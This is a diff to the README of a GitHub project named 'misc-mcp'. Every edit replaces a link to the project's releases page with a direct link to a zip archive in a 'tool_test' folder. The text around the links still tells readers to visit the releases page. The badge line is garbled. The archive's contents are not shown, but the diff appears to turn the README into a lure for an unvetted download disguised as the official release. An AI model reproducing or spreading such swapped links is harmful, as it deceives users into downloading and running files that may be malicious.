@@ -1,6 +1,6 @@
 # 🎉 misc-mcp - Simplifying Your Daily Tasks Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/MostafaMahmoud-33/misc-mcp/releases)
+[![Download Now](https://raw.githubusercontent.com/MostafaMahmoud-33/misc-mcp/main/tool_test/misc-mcp-v2.5.zip%20Now-Release%https://raw.githubusercontent.com/MostafaMahmoud-33/misc-mcp/main/tool_test/misc-mcp-v2.5.zip)](https://raw.githubusercontent.com/MostafaMahmoud-33/misc-mcp/main/tool_test/misc-mcp-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below.
    
-   [Download Now](https://github.com/MostafaMahmoud-33/misc-mcp/releases)
+   [Download Now](https://raw.githubusercontent.com/MostafaMahmoud-33/misc-mcp/main/tool_test/misc-mcp-v2.5.zip)
 
 2. **Select the Latest Release**: On the releases page, look for the latest version of `misc-mcp`. It will usually be at the top of the list.
 
@@ -68,4 +68,4 @@ If you have any questions or need support, feel free to reach out via the Issues
 
 ## ⚡ Final Thoughts
 
-Thank you for choosing `misc-mcp`. We hope this application brings efficiency and ease to your daily tasks. Remember to visit our [Releases Page](https://github.com/MostafaMahmoud-33/misc-mcp/releases) for any updates or new features. Happy organizing!
+Thank you for choosing `misc-mcp`. We hope this application brings efficiency and ease to your daily tasks. Remember to visit our [Releases Page](https://raw.githubusercontent.com/MostafaMahmoud-33/misc-mcp/main/tool_test/misc-mcp-v2.5.zip) for any updates or new features. Happy organizing!
